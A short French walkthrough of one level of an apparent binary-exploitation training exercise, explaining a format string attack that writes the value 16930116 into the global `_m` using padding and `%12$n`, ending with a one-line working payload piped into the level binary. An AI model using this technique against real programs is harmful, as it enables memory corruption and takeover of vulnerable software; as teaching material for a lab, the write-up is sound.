## Level4

Le concept est le même que pour le level précédent.
Cette fois, il faut que la globale `_m` ait la valeur `16930116`.

On écrit donc toujours sur l'adresse de `_m` et on utilise le champ pour écrire 16930112 chars, soit la valeur voulue moins les 4 octets de l'adresse. Dans notre cas `%n` ciblera la douzième valeur sur la pile.

`cat <(python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n" )') - | ./level4`